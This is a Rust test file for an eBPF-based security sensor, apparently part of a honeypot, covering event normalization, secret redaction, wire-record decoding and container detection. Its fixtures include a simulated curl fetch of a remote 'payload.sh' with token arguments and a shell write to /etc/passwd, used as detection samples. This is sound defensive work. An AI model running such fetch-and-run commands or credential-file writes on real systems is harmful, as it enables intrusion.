use ebpf_sensor::{
    capture_plan, container_id_from_cgroup, decode_wire_event, enrich_process_context_from_procfs,
    normalize_kernel_event, run_with_io, Config, KernelEvent, KernelEventKind, WireEventRecord,
    WIRE_EVENT_RECORD_SIZE,
};
use ebpf_sensor_common::SCHEMA_VERSION;

fn test_config() -> Config {
    Config {
        host: "lab-host".to_string(),
        watched_prefixes: vec![
            "/etc".to_string(),
            "/root/.ssh".to_string(),
            "/tmp".to_string(),
        ],
    }
}

#[test]
fn capture_plan_covers_mvp_behavior_families() {
    let plan = capture_plan(&test_config());

    assert_eq!(plan.schema_version, SCHEMA_VERSION);
    assert!(plan
        .probes
        .iter()
        .any(|probe| probe.event_type == "process_exec"));
    assert!(plan
        .probes
        .iter()
        .any(|probe| probe.event_type == "network_connect"));
    assert!(plan.probes.iter().any(|probe| {
        probe.program == "tracepoint_sys_enter_connect"
            && probe.attach_kind == "tracepoint"
            && probe.attach_point == "syscalls/sys_enter_connect"
    }));
    assert!(plan
        .probes
        .iter()
        .any(|probe| probe.event_type == "file_access"));
    assert!(plan
        .probes
        .iter()
        .any(|probe| probe.event_type == "privilege_change"));
    assert!(plan
        .behavior_families
        .contains(&"signature_ioc".to_string()));
    assert!(plan
        .behavior_families
        .contains(&"anomaly_baseline".to_string()));
    assert!(plan
        .behavior_families
        .contains(&"stateful_correlation".to_string()));
}

#[test]
fn capture_dry_run_emits_machine_readable_plan() {
    let mut stdout = Vec::new();
    let mut stderr = Vec::new();

    run_with_io(
        vec![
            "capture".to_string(),
            "--dry-run".to_string(),
            "--config".to_string(),
            "config/ebpf-sensor.toml".to_string(),
        ],
        &mut stdout,
        &mut stderr,
    )
    .unwrap();

    assert!(stderr.is_empty());
    let value: serde_json::Value = serde_json::from_slice(&stdout).unwrap();
    assert_eq!(value["schema_version"], SCHEMA_VERSION);
    assert_eq!(value["mode"], "dry_run");
    assert!(value["readiness"]["btf"].is_boolean());
    assert!(value["probes"].as_array().unwrap().len() >= 6);
}

#[test]
fn kernel_exec_event_normalizes_and_redacts_sensitive_arguments() {
    let event = KernelEvent {
        kind: KernelEventKind::ProcessExec,
        timestamp: "2026-06-16T12:00:00Z".to_string(),
        pid: Some(4242),
        ppid: Some(100),
        uid: Some(1000),
        gid: Some(1000),
        comm: Some("curl".to_string()),
        binary: Some("/usr/bin/curl".to_string()),
        arguments: vec![
            "curl".to_string(),
            "--token=secret-value".to_string(),
            "https://example.invalid/payload.sh".to_string(),
        ],
        filename: None,
        access_type: None,
        src_ip: None,
        src_port: None,
        dest_ip: None,
        dest_port: None,
        protocol: None,
        cgroup_id: Some("cg-1".to_string()),
        container_id: None,
    };

    let normalized = normalize_kernel_event(event, &test_config()).unwrap();

    assert_eq!(normalized.schema_version, SCHEMA_VERSION);
    assert_eq!(normalized.host.as_deref(), Some("lab-host"));
    assert_eq!(normalized.event_type, "process_exec");
    assert_eq!(normalized.binary.as_deref(), Some("/usr/bin/curl"));
    assert_eq!(normalized.arguments_sample[1], "[redacted]");
    assert_eq!(normalized.severity_hint.as_deref(), Some("medium"));
}

#[test]
fn file_events_are_filtered_to_watched_prefixes_and_scored() {
    let watched = KernelEvent {
        kind: KernelEventKind::FileAccess,
        timestamp: "2026-06-16T12:00:01Z".to_string(),
        pid: Some(4242),
        ppid: Some(100),
        uid: Some(0),
        gid: Some(0),
        comm: Some("sh".to_string()),
        binary: Some("/bin/sh".to_string()),
        arguments: Vec::new(),
        filename: Some("/etc/passwd".to_string()),
        access_type: Some("write".to_string()),
        src_ip: None,
        src_port: None,
        dest_ip: None,
        dest_port: None,
        protocol: None,
        cgroup_id: None,
        container_id: None,
    };
    let ignored = KernelEvent {
        filename: Some("/opt/application/cache.db".to_string()),
        ..watched.clone()
    };

    assert!(normalize_kernel_event(ignored, &test_config()).is_none());

    let normalized = normalize_kernel_event(watched, &test_config()).unwrap();
    assert_eq!(normalized.event_type, "file_access");
    assert_eq!(normalized.severity_hint.as_deref(), Some("high"));
}

#[test]
fn capture_without_dry_run_requires_a_probe_object() {
    let mut stdout = Vec::new();
    let mut stderr = Vec::new();

    let err = run_with_io(
        vec![
            "capture".to_string(),
            "--duration-seconds".to_string(),
            "1".to_string(),
        ],
        &mut stdout,
        &mut stderr,
    )
    .unwrap_err();

    assert!(stdout.is_empty());
    assert!(stderr.is_empty());
    assert!(err.contains("--probe-object"));
}

#[cfg(not(feature = "live-ebpf"))]
#[test]
fn capture_with_probe_object_explains_live_feature_boundary() {
    let probe_object = std::env::temp_dir().join(format!(
        "honeypot-ebpf-empty-probe-{}.o",
        std::process::id()
    ));
    std::fs::write(&probe_object, b"\x7fELF").unwrap();

    let mut stdout = Vec::new();
    let mut stderr = Vec::new();
    let err = run_with_io(
        vec![
            "capture".to_string(),
            "--probe-object".to_string(),
            probe_object.display().to_string(),
            "--duration-seconds".to_string(),
            "1".to_string(),
        ],
        &mut stdout,
        &mut stderr,
    )
    .unwrap_err();

    let _ = std::fs::remove_file(&probe_object);
    assert!(stdout.is_empty());
    assert!(stderr.is_empty());
    assert!(err.contains("--features live-ebpf"));
}

#[test]
fn wire_record_round_trips_and_decodes_to_normalized_event() {
    let record = WireEventRecord::new(KernelEventKind::ProcessExec)
        .with_pid(5000)
        .with_ppid(4999)
        .with_uid(1000)
        .with_gid(1000)
        .with_comm("curl")
        .with_binary("/usr/bin/curl")
        .with_argument_sample("curl --password=swordfish https://example.invalid/x.sh")
        .with_cgroup_id("cg-42");

    let bytes = record.to_bytes();
    assert_eq!(bytes.len(), WIRE_EVENT_RECORD_SIZE);

    let decoded = WireEventRecord::from_bytes(&bytes).unwrap();
    let event = decode_wire_event(decoded, "2026-06-16T12:00:02Z", &test_config()).unwrap();

    assert_eq!(event.event_type, "process_exec");
    assert_eq!(event.pid, Some(5000));
    assert_eq!(event.comm.as_deref(), Some("curl"));
    assert_eq!(event.binary.as_deref(), Some("/usr/bin/curl"));
    assert_eq!(event.arguments_sample[0], "[redacted]");
    assert_eq!(event.cgroup_id.as_deref(), Some("cg-42"));
}

#[test]
fn wire_network_record_preserves_peer_address_and_port() {
    let record = WireEventRecord::new(KernelEventKind::NetworkConnect)
        .with_pid(6000)
        .with_uid(1000)
        .with_gid(1000)
        .with_comm("curl")
        .with_dest_ip("93.184.216.34")
        .with_dest_port(443)
        .with_protocol("tcp4");

    let decoded = WireEventRecord::from_bytes(&record.to_bytes()).unwrap();
    let event = decode_wire_event(decoded, "2026-06-16T12:00:04Z", &test_config()).unwrap();

    assert_eq!(event.event_type, "network_connect");
    assert_eq!(event.dest_ip.as_deref(), Some("93.184.216.34"));
    assert_eq!(event.dest_port, Some(443));
    assert_eq!(event.protocol.as_deref(), Some("tcp4"));
    assert_eq!(event.severity_hint.as_deref(), Some("medium"));
}

#[test]
fn procfs_enrichment_adds_argv_sample_and_redacts_sensitive_args() {
    let root = std::env::temp_dir().join(format!("honeypot-procfs-test-{}", std::process::id()));
    let process_dir = root.join("7000");
    std::fs::create_dir_all(&process_dir).unwrap();
    std::fs::write(
        process_dir.join("cmdline"),
        b"/usr/bin/curl\0--token=abc123\0https://example.invalid/payload.sh\0",
    )
    .unwrap();
    let event = WireEventRecord::new(KernelEventKind::ProcessExec)
        .with_pid(7000)
        .with_uid(1000)
        .with_gid(1000)
        .with_comm("curl")
        .with_binary("/usr/bin/curl");
    let decoded = decode_wire_event(event, "2026-06-16T12:00:05Z", &test_config()).unwrap();

    let enriched = enrich_process_context_from_procfs(decoded, &root);

    let _ = std::fs::remove_dir_all(&root);
    assert_eq!(enriched.binary.as_deref(), Some("/usr/bin/curl"));
    assert_eq!(
        enriched.arguments_sample,
        vec![
            "/usr/bin/curl".to_string(),
            "[redacted]".to_string(),
            "https://example.invalid/payload.sh".to_string()
        ]
    );
}

#[test]
fn procfs_enrichment_adds_context_to_network_events() {
    let root = std::env::temp_dir().join(format!(
        "honeypot-procfs-network-test-{}",
        std::process::id()
    ));
    let process_dir = root.join("7100");
    std::fs::create_dir_all(&process_dir).unwrap();
    std::fs::write(
        process_dir.join("cmdline"),
        b"/usr/bin/python3\0-c\0import socket; socket.socket().connect_ex(('127.0.0.1', 9))\0",
    )
    .unwrap();
    let record = WireEventRecord::new(KernelEventKind::NetworkConnect)
        .with_pid(7100)
        .with_uid(1000)
        .with_gid(1000)
        .with_comm("python3")
        .with_dest_ip("127.0.0.1")
        .with_dest_port(9)
        .with_protocol("tcp4");
    let decoded = decode_wire_event(record, "2026-06-16T12:00:06Z", &test_config()).unwrap();

    let enriched = enrich_process_context_from_procfs(decoded, &root);

    let _ = std::fs::remove_dir_all(&root);
    assert_eq!(enriched.event_type, "network_connect");
    assert_eq!(enriched.binary.as_deref(), Some("/usr/bin/python3"));
    assert_eq!(enriched.dest_ip.as_deref(), Some("127.0.0.1"));
    assert_eq!(enriched.dest_port, Some(9));
    assert_eq!(enriched.arguments_sample[0], "/usr/bin/python3");
}

#[test]
fn wire_record_rejects_wrong_size_or_unknown_kind() {
    assert!(WireEventRecord::from_bytes(&[0u8; 8]).is_err());

    let mut bytes = WireEventRecord::new(KernelEventKind::ProcessExec).to_bytes();
    bytes[2] = 255;
    let decoded = WireEventRecord::from_bytes(&bytes).unwrap();
    assert!(decode_wire_event(decoded, "2026-06-16T12:00:03Z", &test_config()).is_none());
}

const CID: &str = "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789";

#[test]
fn container_id_from_cgroup_parses_docker_layouts() {
    // cgroup v2 systemd scope
    assert_eq!(
        container_id_from_cgroup(&format!("0::/system.slice/docker-{CID}.scope")).as_deref(),
        Some(CID)
    );
    // cgroup v1 with controller columns
    assert_eq!(
        container_id_from_cgroup(&format!("12:pids:/docker/{CID}\n11:memory:/docker/{CID}"))
            .as_deref(),
        Some(CID)
    );
}

#[test]
fn container_id_from_cgroup_ignores_host_processes() {
    assert_eq!(container_id_from_cgroup("0::/init.scope"), None);
    assert_eq!(
        container_id_from_cgroup("0::/user.slice/user-1000.slice/session-3.scope"),
        None
    );
}

#[test]
fn procfs_enrichment_populates_container_id_from_cgroup() {
    let root = std::env::temp_dir().join(format!("honeypot-cgroup-test-{}", std::process::id()));
    let process_dir = root.join("7200");
    std::fs::create_dir_all(&process_dir).unwrap();
    std::fs::write(
        process_dir.join("cgroup"),
        format!("0::/system.slice/docker-{CID}.scope\n"),
    )
    .unwrap();
    let record = WireEventRecord::new(KernelEventKind::ProcessExec)
        .with_pid(7200)
        .with_comm("curl")
        .with_binary("/usr/bin/curl");
    let decoded = decode_wire_event(record, "2026-06-23T18:56:01Z", &test_config()).unwrap();

    let enriched = enrich_process_context_from_procfs(decoded, &root);

    let _ = std::fs::remove_dir_all(&root);
    assert_eq!(enriched.container_id.as_deref(), Some(CID));
}
